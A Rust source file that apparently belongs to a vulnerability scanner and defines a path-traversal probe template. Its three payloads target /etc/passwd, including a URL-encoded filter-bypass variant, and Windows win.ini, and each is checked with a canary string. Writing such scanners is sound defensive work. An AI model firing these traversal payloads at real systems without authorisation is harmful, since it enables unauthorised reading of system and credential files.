use super::{OracleKind, Probe, ProbeRisk, ProbeTemplate};
use uuid::Uuid;

pub fn template() -> ProbeTemplate {
    let _canary = format!("FRENSENSE_{}", &Uuid::new_v4().to_string()[..8].to_uppercase());
    ProbeTemplate {
        category: "path_traversal",
        baseline_payload: "profile.txt",
        probes: vec![
            Probe {
                id: Uuid::new_v4().to_string(),
                payload: "../../../../etc/passwd".to_string(),
                oracle: OracleKind::CanaryInBody {
                    canary: "root:x:0:0".to_string(),
                },
                risk: ProbeRisk::Safe,
                description: "Path traversal to /etc/passwd — root line confirms file read".to_string(),
            },
            Probe {
                id: Uuid::new_v4().to_string(),
                payload: "..%2F..%2F..%2F..%2Fetc%2Fpasswd".to_string(),
                oracle: OracleKind::CanaryInBody {
                    canary: "root:x:0:0".to_string(),
                },
                risk: ProbeRisk::Safe,
                description: "URL-encoded traversal — bypasses naive string filters".to_string(),
            },
            Probe {
                id: Uuid::new_v4().to_string(),
                payload: "..\\..\\..\\windows\\win.ini".to_string(),
                oracle: OracleKind::CanaryInBody {
                    canary: "[fonts]".to_string(),
                },
                risk: ProbeRisk::Safe,
                description: "Windows path traversal to win.ini".to_string(),
            },
        ],
    }
}
